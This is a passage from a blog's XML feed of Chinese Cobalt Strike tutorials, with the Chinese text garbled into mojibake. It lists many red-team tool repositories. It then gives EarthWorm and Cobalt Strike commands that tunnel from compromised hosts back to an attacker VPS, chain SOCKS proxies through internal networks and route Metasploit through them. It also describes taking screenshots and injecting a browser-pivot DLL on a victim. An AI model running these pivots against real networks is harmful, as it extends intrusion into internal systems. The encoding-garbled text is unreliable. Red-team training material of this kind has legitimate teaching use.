href="https://github.com/360-A-Team/CobaltStrike-Toolset">https://github.com/360-A-Team/CobaltStrike-Toolset</a> <a href="https://github.com/ars3n11/Aggressor-Scripts">https://github.com/ars3n11/Aggressor-Scripts</a> <a href="https://github.com/michalkoczwara/aggressor_scripts_collection">https://github.com/michalkoczwara/aggressor_scripts_collection</a> <a href="https://github.com/vysec/Aggressor-VYSEC">https://github.com/vysec/Aggressor-VYSEC</a><br><a href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit">https://github.com/killswitch-GUI/CobaltStrike-ToolKit</a> <a href="https://github.com/ZonkSec/persistence-aggressor-script">https://github.com/ZonkSec/persistence-aggressor-script</a> <a href="https://github.com/ramen0x3f/AggressorScripts">https://github.com/ramen0x3f/AggressorScripts</a><br><a href="https://github.com/rasta-mouse/Aggressor-Script">https://github.com/rasta-mouse/Aggressor-Script</a> <a href="https://github.com/RhinoSecurityLabs/Aggressor-Scripts">https://github.com/RhinoSecurityLabs/Aggressor-Scripts</a> <a href="https://github.com/Und3rf10w/Aggressor-scripts">https://github.com/Und3rf10w/Aggressor-scripts</a><br><a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a><br><a href="https://github.com/Genetic-Malware/Ebowla">https://github.com/Genetic-Malware/Ebowla</a> <a href="https://github.com/001SPARTaN/aggressor_scripts">https://github.com/001SPARTaN/aggressor_scripts</a> <a href="https://github.com/gaudard/scripts/tree/master/red-team/aggressor">https://github.com/gaudard/scripts/tree/master/red-team/aggressor</a> <a href="https://github.com/branthale/CobaltStrikeCNA">https://github.com/branthale/CobaltStrikeCNA</a> <a href="https://github.com/oldb00t/AggressorScripts">https://github.com/oldb00t/AggressorScripts</a> <a href="https://github.com/p292/Phant0m_cobaltstrike">https://github.com/p292/Phant0m_cobaltstrike</a> <a href="https://github.com/p292/DDEAutoCS">https://github.com/p292/DDEAutoCS</a> <a href="https://github.com/secgroundzero/CS-Aggressor-Scripts">https://github.com/secgroundzero/CS-Aggressor-Scripts</a> <a href="https://github.com/skyleronken/Aggressor-Scripts">https://github.com/skyleronken/Aggressor-Scripts</a> <a href="https://github.com/tevora-threat/aggressor-powerview">https://github.com/tevora-threat/aggressor-powerview</a> <a href="https://github.com/tevora-threat/PowerView3-Aggressor">https://github.com/tevora-threat/PowerView3-Aggressor</a> <a href="https://github.com/threatexpress/aggressor-scripts">https://github.com/threatexpress/aggressor-scripts</a> <a href="https://github.com/threatexpress/red-team-scripts">https://github.com/threatexpress/red-team-scripts</a><br><a href="https://github.com/threatexpress/persistence-aggressor-script">https://github.com/threatexpress/persistence-aggressor-script</a> <a href="https://github.com/FortyNorthSecurity/AggressorAssessor">https://github.com/FortyNorthSecurity/AggressorAssessor</a> <a href="https://github.com/mdsecactivebreach/CACTUSTORCH">https://github.com/mdsecactivebreach/CACTUSTORCH</a> <a href="https://github.com/C0axx/AggressorScripts">https://github.com/C0axx/AggressorScripts</a> <a href="https://github.com/offsecginger/AggressorScripts">https://github.com/offsecginger/AggressorScripts</a> <a href="https://github.com/tomsteele/cs-magik">https://github.com/tomsteele/cs-magik</a> <a href="https://github.com/bitsadmin/nopowershell">https://github.com/bitsadmin/nopowershell</a> <a href="https://github.com/SpiderLabs/SharpCompile">https://github.com/SpiderLabs/SharpCompile</a> <a href="https://github.com/SpiderLabs/SharpCompile">https://github.com/SpiderLabs/SharpCompile</a> <a href="https://github.com/realoriginal/reflectivepotato">https://github.com/realoriginal/reflectivepotato</a></p><p>è¿˜æœ‰å¾ˆå¤šå¾ˆå¤šæˆ‘å°±ä¸åˆ—å‡ºæ¥äº†å¤ªéº»çƒ¦äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrikeç³»åˆ—æ•™ç¨‹(ä¹)å†…ç½®Socksä¸ç¥å™¨EW</title>
      <link href="/2019/06/16/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B9%9D-%E5%86%85%E7%BD%AESocks%E4%B8%8E%E7%A5%9E%E5%99%A8EW/"/>
      <url>/2019/06/16/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B9%9D-%E5%86%85%E7%BD%AESocks%E4%B8%8E%E7%A5%9E%E5%99%A8EW/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Socksæ¦‚å¿µ"><a href="#0x01-Socksæ¦‚å¿µ" class="headerlink" title="0x01-Socksæ¦‚å¿µ"></a>0x01-Socksæ¦‚å¿µ</h2><p>ç›®å‰åˆ©ç”¨ç½‘ç»œé˜²ç«å¢™å°†ç»„ç»‡å†…éƒ¨çš„ç½‘ç»œç»“æ„ä¸å¤–éƒ¨ç½‘ç»œå¦‚ INTERNET ä¸­æœ‰æ•ˆåœ°éš”ç¦»å¼€æ¥ï¼Œè¿™ç§æ–¹æ³•æ­£å˜å¾—é€æ¸æµè¡Œèµ·æ¥ã€‚è¿™äº›é˜²ç«å¢™ç³»ç»Ÿé€šå¸¸ä»¥åº”ç”¨å±‚ç½‘å…³çš„å½¢å¼å·¥ä½œåœ¨ç½‘ç»œä¹‹é—´ï¼Œæä¾›å—æ§çš„ TELNET ã€ FTP ã€ SMTP ç­‰çš„æ¥å…¥ã€‚ SOCKS æä¾›ä¸€ä¸ªé€šç”¨æ¡†æ¶æ¥ä½¿è¿™äº›åè®®å®‰å…¨é€æ˜åœ°ç©¿è¿‡é˜²ç«å¢™ã€‚<br>è¯´çš„ç®€å•æ˜äº†ä¸€ç‚¹ï¼Œåœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨socksæŠ€æœ¯ï¼Œå¯ä»¥ç©¿é€è¿›å…¥ç›®æ ‡æœºçš„å†…ç½‘ï¼Œä»è€Œæ‰©å¤§æˆ‘ä»¬çš„æˆ˜æœ<br><img src="/"></p><h2 id="0x002-Cobaltstrikeè‡ªå¸¦SocksåŠŸèƒ½"><a href="#0x002-Cobaltstrikeè‡ªå¸¦SocksåŠŸèƒ½" class="headerlink" title="0x002-Cobaltstrikeè‡ªå¸¦SocksåŠŸèƒ½"></a>0x002-Cobaltstrikeè‡ªå¸¦SocksåŠŸèƒ½</h2><p>é€‰æ‹©ä¸€ä¸ªbeaconï¼Œå³é”®ï¼Œä¸­è½¬â€“&gt;SOCKS Serverï¼Œæˆ–ä½¿ç”¨å‘½ä»¤socks [port]<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542627.png" alt="image"></p><p>å¼¹å‡ºä¸€ä¸ªçª—å£ï¼ŒæŒ‰è¦æ±‚é…ç½®å¥½ä»£ç†ç«¯å£<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542560.png" alt="image"></p><p>å¦‚å›¾ï¼ŒæˆåŠŸå¼€å¯socks 4ï¼Œè¿æ¥æˆ‘ä»¬teamserverçš„5126ç«¯å£ï¼Œå³å¯è¿›å…¥ç›®æ ‡æœºå†…ç½‘~<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542192.png" alt="image"></p><h2 id="0x03-ä½¿ç”¨ew-SocksCapç©¿é€åˆ°ç›®æ ‡æœºå†…ç½‘"><a href="#0x03-ä½¿ç”¨ew-SocksCapç©¿é€åˆ°ç›®æ ‡æœºå†…ç½‘" class="headerlink" title="0x03-ä½¿ç”¨ew+SocksCapç©¿é€åˆ°ç›®æ ‡æœºå†…ç½‘"></a>0x03-ä½¿ç”¨ew+SocksCapç©¿é€åˆ°ç›®æ ‡æœºå†…ç½‘</h2><h3 id="â‘ Earthworm-ä¸‹è½½è§æ–‡æœ«"><a href="#â‘ Earthworm-ä¸‹è½½è§æ–‡æœ«" class="headerlink" title="â‘ Earthworm(ä¸‹è½½è§æ–‡æœ«)"></a>â‘ Earthworm(ä¸‹è½½è§æ–‡æœ«)</h3><p>Ew(Earthworm)æ˜¯ä¸€æ¬¾å½“ä¹‹æ— æ„§çš„å†…ç½‘ç©¿é€å¤§æ€å™¨ï¼Œåº”ç”¨çš„å¹³å°éå¸¸å¹¿æ³›ï¼ŒåŒ…æ‹¬</p><pre><code>ew_for_Win.exe        é€‚ç”¨å„ç§Windowsç³»ç»Ÿ(X86æŒ‡ä»¤é›†ã€X64æŒ‡ä»¤é›†)        Windows7ã€Windows XPew_for_Linux32        å„å¸¸è§Linuxå‘è¡Œç‰ˆ (X86 æŒ‡ä»¤é›† CPU)        Ubuntu(X86)/BT5(X86)ew_for_linux64        å„å¸¸è§Linuxå‘è¡Œç‰ˆ (X64 æŒ‡ä»¤é›† CPU)        Ubuntu(X64)/Kali(X64)ew_for_MacOSX64        MacOSç³»ç»Ÿå‘è¡Œç‰ˆ (X64 æŒ‡ä»¤é›†)        è‹¹æœPCç”µè„‘ï¼Œè‹¹æœserverew_for_Arm32        å¸¸è§Arm-Linuxç³»ç»Ÿ        HTC New One(Arm-Android)/å°ç±³è·¯ç”±å™¨(R1D)ew_mipsel        å¸¸è§Mips-Linuxç³»ç»Ÿ (MipselæŒ‡ä»¤é›† CPU)        è¤çŸ³ç¡¬ç›˜å½•åƒæœºã€å°ç±³miniè·¯ç”±å™¨(R1CM)</code></pre><p>ä¸‹é¢ç®€å•è®²ä¸€ä¸‹å®ƒçš„åº”ç”¨åœºæ™¯å’Œå‘½ä»¤<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542432.png" alt="image"></p><h3 id="æ­£å‘socks-v5æœåŠ¡å™¨-ã€é€‚ç”¨äºç›®æ ‡æœºæ‹¥æœ‰ä¸€ä¸ªå¤–ç½‘IPã€‘"><a href="#æ­£å‘socks-v5æœåŠ¡å™¨-ã€é€‚ç”¨äºç›®æ ‡æœºæ‹¥æœ‰ä¸€ä¸ªå¤–ç½‘IPã€‘" class="headerlink" title="æ­£å‘socks v5æœåŠ¡å™¨        ã€é€‚ç”¨äºç›®æ ‡æœºæ‹¥æœ‰ä¸€ä¸ªå¤–ç½‘IPã€‘"></a>æ­£å‘socks v5æœåŠ¡å™¨        ã€é€‚ç”¨äºç›®æ ‡æœºæ‹¥æœ‰ä¸€ä¸ªå¤–ç½‘IPã€‘</h3><p>æœåŠ¡å™¨ç«¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤<br>ew.exe -s ssocksd -l 888</p><p>è¯´æ˜ï¼šæœåŠ¡å™¨å¼€å¯ç«¯å£ä¸º888ï¼ŒSOCKSçš„ä»£ç†ã€‚ç„¶åä½¿ç”¨sockscap64æ·»åŠ è¿™ä¸ªIPçš„ä»£ç†å°±å¯ä»¥ä½¿ç”¨äº†ã€‚</p><h3 id="åå¼¹socks-v5æœåŠ¡å™¨-ã€é€‚ç”¨äºç›®æ ‡æœºå™¨æ²¡æœ‰å…¬ç½‘IPï¼Œä½†å¯è®¿é—®å†…ç½‘èµ„æºã€‘"><a href="#åå¼¹socks-v5æœåŠ¡å™¨-ã€é€‚ç”¨äºç›®æ ‡æœºå™¨æ²¡æœ‰å…¬ç½‘IPï¼Œä½†å¯è®¿é—®å†…ç½‘èµ„æºã€‘" class="headerlink" title="åå¼¹socks v5æœåŠ¡å™¨        ã€é€‚ç”¨äºç›®æ ‡æœºå™¨æ²¡æœ‰å…¬ç½‘IPï¼Œä½†å¯è®¿é—®å†…ç½‘èµ„æºã€‘"></a>åå¼¹socks v5æœåŠ¡å™¨        ã€é€‚ç”¨äºç›®æ ‡æœºå™¨æ²¡æœ‰å…¬ç½‘IPï¼Œä½†å¯è®¿é—®å†…ç½‘èµ„æºã€‘</h3><p>æœ¬åœ°æ‰§è¡Œä»¥ä¸‹å‘½ä»¤<br>ew.exe -s rcsocks -l 1008 -e 888</p><p>è¯´æ˜ï¼šè¯¥å‘½ä»¤çš„æ„æ€æ˜¯åœ¨æˆ‘ä»¬å…¬ç½‘VPSä¸Šæ·»åŠ ä¸€ä¸ªè½¬æ¥éš§é“ï¼ŒæŠŠ1080ç«¯å£æ”¶åˆ°çš„ä»£ç†è¯·æ±‚è½¬äº¤ç»™888ç«¯å£ã€‚</p><p>æœåŠ¡å™¨ç«¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤<br>ew.exe -s rssocks -d 2.2.2.2 -e 888</p><p>è¯´æ˜ï¼šè¯¥å‘½ä»¤çš„æ„æ€æ˜¯åœ¨æœåŠ¡å™¨ä¸Šå¯åŠ¨SOCKS V5æœåŠ¡ï¼Œå¹¶åå¼¹åˆ°IPåœ°å€ä¸º2.2.2.2çš„æœåŠ¡å™¨888ç«¯å£ä¸Šã€‚</p><h3 id="äºŒçº§ç½‘ç»œç¯å¢ƒï¼ˆä¸€ï¼‰"><a href="#äºŒçº§ç½‘ç»œç¯å¢ƒï¼ˆä¸€ï¼‰" class="headerlink" title="äºŒçº§ç½‘ç»œç¯å¢ƒï¼ˆä¸€ï¼‰"></a>äºŒçº§ç½‘ç»œç¯å¢ƒï¼ˆä¸€ï¼‰</h3><p>å‡è®¾æˆ‘ä»¬è·å¾—äº†å³ä¾§Aä¸»æœºå’ŒBä¸»æœºçš„æ§åˆ¶æƒ<br>Aä¸»æœºé…æœ‰2å—ç½‘å¡ï¼Œä¸€å—è¿é€šå¤–ç½‘ï¼Œä¸€å—10.48.128.25åªèƒ½è¿æ¥å†…ç½‘Bä¸»æœºï¼Œæ— æ³•è®¿é—®å†…ç½‘å…¶å®ƒèµ„æºã€‚<br>Bä¸»æœºå¯ä»¥è®¿é—®å†…ç½‘èµ„æºï¼Œä½†æ— æ³•è®¿é—®å¤–ç½‘ã€‚</p><p>A.å…ˆä¸Šä¼ ewåˆ°Bä¸»æœºï¼Œåˆ©ç”¨ssocksdæ–¹å¼å¯åŠ¨888ç«¯å£çš„SOCKSä»£ç†ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š<br>ew -s ssocksd -l 888</p><p>B.ä¸Šä¼ ewåˆ°å³ä¾§Aä¸»æœºï¼Œè¿è¡Œä¸‹åˆ—å‘½ä»¤ï¼š<br>ew -s lcx_tran -l 1080 -f 10.48.128.49 -g 888</p><p>è¯´æ˜ï¼šè¯¥å‘½ä»¤æ„æ€æ˜¯å°†1080ç«¯å£æ”¶åˆ°çš„ä»£ç†è¯·æ±‚è½¬äº¤ç»™Bä¸»æœºï¼ˆ10.48.128.49ï¼‰çš„888ç«¯å£ã€‚</p><p>C.å¯ä»¥é€šè¿‡è®¿é—®Aä¸»æœºå¤–ç½‘139.XXX.XX.113:1080æ¥ä½¿ç”¨åœ¨Bä¸»æœºæ¶è®¾çš„socks5ä»£ç†ã€‚</p><h3 id="äºŒçº§ç½‘ç»œç¯å¢ƒï¼ˆäºŒï¼‰"><a href="#äºŒçº§ç½‘ç»œç¯å¢ƒï¼ˆäºŒï¼‰" class="headerlink" title="äºŒçº§ç½‘ç»œç¯å¢ƒï¼ˆäºŒï¼‰"></a>äºŒçº§ç½‘ç»œç¯å¢ƒï¼ˆäºŒï¼‰</h3><p>å‡è®¾æˆ‘ä»¬è·å¾—äº†å³ä¾§Aä¸»æœºå’ŒBä¸»æœºçš„æ§åˆ¶æƒé™ã€‚<br>Aä¸»æœºæ²¡æœ‰å…¬ç½‘IPï¼Œä¹Ÿæ— æ³•è®¿é—®å†…ç½‘èµ„æºã€‚Bä¸»æœºå¯ä»¥è®¿é—®å†…ç½‘èµ„æºï¼Œä½†æ— æ³•è®¿é—®å¤–ç½‘ã€‚</p><p>è¿™ä¸ªæ“ä½œåˆ†ä¸º4æ­¥ï¼Œç”¨åˆ°lcx_listenå’Œlcx_slaveå‘½ä»¤ï¼š</p><p>A. å…ˆä¸Šä¼ ew åˆ°å·¦ä¾§å…¬ç½‘VPSä¸Šï¼Œè¿è¡Œä¸‹åˆ—å‘½ä»¤ï¼š<br>ew â€“s lcx_listen â€“l 10800 â€“e 888<br>è¯´æ˜ï¼šè¯¥å‘½ä»¤æ„æ€æ˜¯åœ¨å…¬ç½‘VPSæ·»åŠ è½¬æ¥éš§é“ï¼Œå°†10800ç«¯å£æ”¶åˆ°çš„ä»£ç†è¯·æ±‚è½¬äº¤ç»™888ç«¯å£ã€‚</p><p>B.ä¸Šä¼ ewåˆ°Bä¸»æœºï¼Œå¹¶åˆ©ç”¨ssocksdæ–¹å¼å¯åŠ¨999ç«¯å£çš„socksä»£ç†ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š<br>ew -s ssocksd -l 999</p><p>C.ä¸Šä¼ ew åˆ°Aä¸»æœºï¼Œè¿è¡Œä¸‹åˆ—å‘½ä»¤ï¼š<br>ew -s lcx_slave -d 139.XXX.XX.113 -e 888 -f 10.48.128.49 -g 999<br>è¯´æ˜ï¼šè¯¥å‘½ä»¤æ„æ€æ˜¯åœ¨Aä¸»æœºä¸Šåˆ©ç”¨lcx_slaveæ–¹å¼ï¼Œå°†å…¬ç½‘VPSçš„888ç«¯å£å’ŒBä¸»æœºçš„999ç«¯å£è¿æ¥èµ·æ¥ã€‚</p><p>D. è¿”å›æˆ‘ä»¬å…¬ç½‘VPSçš„CMDç•Œé¢ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°å·²ç»è¿æ¥æˆåŠŸäº†ã€‚<br>ç°åœ¨å°±å¯ä»¥é€šè¿‡è®¿é—®å…¬ç½‘VPSåœ°å€ 139.XXX.XX.113:10800æ¥ä½¿ç”¨åœ¨Bä¸»æœºæ¶è®¾çš„socks5ä»£ç†ã€‚</p><h3 id="ä¸‰çº§ç½‘ç»œç¯å¢ƒ"><a href="#ä¸‰çº§ç½‘ç»œç¯å¢ƒ" class="headerlink" title="ä¸‰çº§ç½‘ç»œç¯å¢ƒ"></a>ä¸‰çº§ç½‘ç»œç¯å¢ƒ</h3><p>ä¸‰çº§ç½‘ç»œç¯å¢ƒåœ¨å®é™…æ¸—é€ä¸­ç”¨çš„æ¯”è¾ƒå°‘ï¼Œä¹Ÿæ¯”è¾ƒå¤æ‚ï¼Œç°åœ¨æˆ‘ä»¬æ¥ä¸€ä¸ªä¸ªçš„è®²è§£ä¸‹ä¸‰çº§çº§è”çš„ç”¨æ³•ã€‚</p><p>å‡è®¾æ¸—é€åœºæ™¯ï¼š<br>å†…ç½‘Aä¸»æœºæ²¡æœ‰å…¬ç½‘IPä½†å¯ä»¥è®¿é—®å¤–ç½‘<br>Bä¸»æœºä¸èƒ½è®¿é—®å¤–ç½‘ä½†å¯ä»¥è¢«Aä¸»æœºè®¿é—®ã€Cä¸»æœºå¯è¢«Bä¸»æœºè®¿é—®è€Œä¸”èƒ½å¤Ÿè®¿é—®æ ¸å¿ƒåŒºåŸŸã€‚</p><p>A.åœ¨å·¦ä¾§å…¬ç½‘VPSä¸Šè¿è¡Œå‘½ä»¤ï¼Œå°†1080ç«¯å£æ”¶åˆ°çš„ä»£ç†è¯·æ±‚è½¬äº¤ç»™888ç«¯å£ï¼š<br>ew -s rcsocks -l 1080 -e 888</p><p>B.åœ¨Aä¸»æœºä¸Šè¿è¡Œå‘½ä»¤ï¼Œå°†å…¬ç½‘VPSçš„888ç«¯å£å’ŒBä¸»æœºçš„999ç«¯å£è¿æ¥èµ·æ¥ï¼š<br>ew -s lcx_slave -d 139.XXX.XX.113 -e 888 -f 10.48.128.12 -g 999</p><p>C.åœ¨Bä¸»æœºä¸Šè¿è¡Œå‘½ä»¤ï¼Œå°†999ç«¯å£æ”¶åˆ°çš„ä»£ç†è¯·æ±‚è½¬äº¤ç»™777ç«¯å£ï¼š<br>ew -s lcx_listen -l 999 -e 777</p><p>D.åœ¨Cä¸»æœºä¸Šå¯åŠ¨SOCKS V5æœåŠ¡ï¼Œå¹¶åå¼¹åˆ°Bä¸»æœºçš„777ç«¯å£ä¸Šï¼Œå‘½ä»¤å¦‚ä¸‹ã€‚<br>ew -s rssocks -d 10.48.128.12 -e 777</p><p>E.åœ¨MY PCä¸Šå¯ä»¥é€šè¿‡è®¿é—®å…¬ç½‘VPS 139.XXX.XX.113:1080æ¥ä½¿ç”¨åœ¨Cä¸»æœºæ¶è®¾çš„socks5ä»£ç†ã€‚</p><p>æ•´ä¸ªæ•°æ®æµå‘æ˜¯ï¼šSOCKS V5 â†’ 1080 â†’ 888 â†’999 â†’777 â†’ rssocks</p><h2 id="å®æˆ˜åœºæ™¯"><a href="#å®æˆ˜åœºæ™¯" class="headerlink" title="å®æˆ˜åœºæ™¯"></a>å®æˆ˜åœºæ™¯</h2><p>æœ¬æ¬¡æµ‹è¯•ç›®æ ‡æœºå™¨æ²¡æœ‰å…¬ç½‘IPï¼Œä½†å¯è®¿é—®å†…ç½‘èµ„æº<br>1.æˆ‘ä»¬åœ¨teamserverä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤<br>ew.exe -s rcsocks -l 1008 -e 888<br>æ¥å—888ç«¯å£æ•°æ®ï¼Œç„¶åè½¬å‘åˆ°1008ç«¯å£<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542245.png" alt="image"></p><p>2.ç„¶åæˆ‘ä»¬åœ¨ç›®æ ‡æœºä¸Šä¼ ewï¼Œç„¶ååœ¨csä¸­æ‰§è¡Œ<br>ew.exe -s rssocks -d 2.2.2.2 -e 888ï¼ˆ2.2.2.2ä¸ºteamserverï¼‰<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542860.png" alt="image"></p><p>3.éšåï¼Œæˆ‘ä»¬çš„teamserverå°±ä¼šæ˜¾ç¤ºè¿æ¥æˆåŠŸ<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542807.png" alt="image"></p><h3 id="â‘¡ä½¿ç”¨SocksCapè¿æ¥socks"><a href="#â‘¡ä½¿ç”¨SocksCapè¿æ¥socks" class="headerlink" title="â‘¡ä½¿ç”¨SocksCapè¿æ¥socks"></a>â‘¡ä½¿ç”¨SocksCapè¿æ¥socks</h3><p>æ ¹æ®è‡ªå·±çš„Windowsç‰ˆæœ¬ä»¥ç®¡ç†å‘˜æ¨¡å¼è¿è¡ŒSocksCapå<br>ç‚¹å‡»ä»£ç†ï¼Œç„¶åæ·»åŠ è‡ªå·±teamserverçš„ipå’Œåˆšåˆšè½¬å‘å‡ºæ¥çš„ç«¯å£<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542246.png" alt="image"></p><p>åœ¨è¿™é‡ŒæŠŠä»£ç†åˆ‡æ¢æˆåˆšåˆšæ·»åŠ çš„<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542779.png" alt="image"></p><p>å³é”®ï¼Œæ·»åŠ ä¸€ä¸ªexeæ–‡ä»¶ï¼Œæ ¹æ®ä½ çš„éœ€æ±‚ï¼Œæ·»åŠ è¦åœ¨sockséš§é“ä¸­è¿è¡Œçš„ç¨‹åº</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191543208.png" alt="image"></p><p>é€‰æ‹©ç¨‹åºï¼Œå³é”®â€“&gt;åœ¨ä»£ç†éš§é“ä¸­è¿è¡Œé€‰ä¸­ç¨‹åºï¼Œè¯¥ç¨‹åºå³å¯é€šè¿‡socksè¿›å…¥ç›®æ ‡å†…ç½‘</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191543868.png" alt="image"></p><p>å¦‚å›¾ï¼Œä¸ºè¿å…¥socksé€šé“çš„cmd pingç›®æ ‡æœºçš„æŸå†…ç½‘ip<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191543675.png" alt="image"></p><h2 id="0x004-åœ¨Kaliä¸­Metasploitä½¿ç”¨socksé€šé“"><a href="#0x004-åœ¨Kaliä¸­Metasploitä½¿ç”¨socksé€šé“" class="headerlink" title="0x004-åœ¨Kaliä¸­Metasploitä½¿ç”¨socksé€šé“"></a>0x004-åœ¨Kaliä¸­Metasploitä½¿ç”¨socksé€šé“</h2><p>1.ä½¿ç”¨csæ­å»ºå¥½socks4é€šé“åï¼Œé¦–å…ˆé…ç½®ç¥å™¨proxychains<br>åœ¨&#x2F;etc&#x2F;proxychains.confé…ç½®æ–‡ä»¶ä¸­æ·»åŠ æ–°çš„ä»£ç†æœåŠ¡å™¨ã€‚é€šè¿‡æ¿€æ´»åŠ¨æ€é“¾è®¾ç½®ï¼Œç¡®ä¿åœ¨ä¸åŒçš„ä»£ç†æœåŠ¡å™¨ä¹‹é—´èƒ½å¤Ÿæ­£å¸¸åˆ‡æ¢ã€‚</p><pre><code>root@kali:~# cat /etc/proxychains.conf | grep -v &quot;#&quot;dynamic_chainproxy_dnstcp_read_time_out 15000tcp_connect_time_out 8000socks4  172.16.0.20 1080  # socks4é€šé“çš„IPåŠç«¯å£</code></pre><p>ç„¶ååœ¨MSFä¸­ï¼Œé…ç½®socks4éš§é“å³å¯è®©MSFè¿›å…¥ç›®æ ‡æœºå†…ç½‘å¤§æ€å››æ–¹<br>(2.2.2.2ä¸ºteamserverçš„ipï¼Œ1081ä¸ºsocksç«¯å£)</p><pre><code>msf exploit(ms08_067_netapi) &gt; use auxiliary/server/socks4amsf auxiliary(socks4a) &gt; set SRVHOST 2.2.2.2msf auxiliary(socks4a) &gt; set SRVPORT 1081SRVPORT =&gt; 1081msf auxiliary(socks4a) &gt; runAuxiliary module execution completedStarting the socks4a proxy servermsf auxiliary(socks4a) &gt;</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191543028.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrikeç³»åˆ—æ•™ç¨‹(å…«)æˆªå›¾ä¸æµè§ˆå™¨ä»£ç†</title>
      <link href="/2019/06/15/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%85%AB-%E6%88%AA%E5%9B%BE%E4%B8%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BB%A3%E7%90%86/"/>
      <url>/2019/06/15/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%85%AB-%E6%88%AA%E5%9B%BE%E4%B8%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-æˆªå›¾"><a href="#0x01-æˆªå›¾" class="headerlink" title="0x01-æˆªå›¾"></a>0x01-æˆªå›¾</h2><p>é€‰æ‹©ä¸€ä¸ªbeaconï¼Œå³é”®ï¼Œç›®æ ‡â€“&gt;å±å¹•æˆªå›¾<br><a href="https://imgchr.com/i/elz5wD"><img src="https://s2.ax1x.com/2019/07/28/elz5wD.png" alt="elz5wD.png"></a><br>ç„¶åç‚¹å‡»èœå•æ ä¸Šçš„â€œå±å¹•æˆªå›¾â€æŒ‰é’®ï¼Œå¦‚å›¾ï¼ŒæˆåŠŸæŸ¥çœ‹åˆ°æˆªå›¾<br><a href="https://imgchr.com/i/elz7Yd"><img src="https://s2.ax1x.com/2019/07/28/elz7Yd.png" alt="elz7Yd.png"></a></p><h2 id="0x02-æµè§ˆå™¨ä»£ç†"><a href="#0x02-æµè§ˆå™¨ä»£ç†" class="headerlink" title="0x02-æµè§ˆå™¨ä»£ç†"></a>0x02-æµè§ˆå™¨ä»£ç†</h2><p>é€‰æ‹©ä¸€ä¸ªbeaconï¼Œå³é”®ï¼Œç›®æ ‡â€“&gt;æµè§ˆå™¨ä»£ç†<br><a href="https://imgchr.com/i/elzITe"><img src="https://s2.ax1x.com/2019/07/28/elzITe.png" alt="elzITe.png"></a><br>é…ç½®å¥½ç›¸å…³çš„ç«¯å£ä¿¡æ¯åï¼Œç‚¹å‡»å¼€å§‹ï¼Œå³å¯ä½¿ç”¨ç›®æ ‡æœºçš„æŒ‡å®šç«¯å£ä½œä¸ºæµè§ˆå™¨ä»£ç†<br><a href="https://imgchr.com/i/elzTFH"><img src="https://s2.ax1x.com/2019/07/28/elzTFH.png" alt="elzTFH.png"></a><br>éšåcobaltstrikeå°±ä¼šæ³¨å…¥æµè§ˆå™¨ä»£ç†dllåˆ°è¿›ç¨‹ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡é…ç½®æˆ‘ä»¬æœåŠ¡å™¨çš„IP,ç«¯å£ï¼ˆæœ¬ä¾‹ä¸­ä¸º123.207.x&#x2F;xï¼‰ï¼Œå³å¯ä½¿ç”¨ç›®æ ‡æœºä½œä¸ºæµè§ˆå™¨ä»£ç†<br><a href="https://imgchr.com/i/elz4eO"><img src="https://s2.ax1x.com/2019/07/28/elz4eO.png" alt="elz4eO.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrikeç³»åˆ—æ•™ç¨‹(ä¸ƒ)ç«¯å£æ‰«æä¸Net View</title>
      <link href="/2019/06/15/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B8%83-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E4%B8%8ENet-View/"/>
      <url>/2019/06/15/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B8%83-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E4%B8%8ENet-View/</url>
      
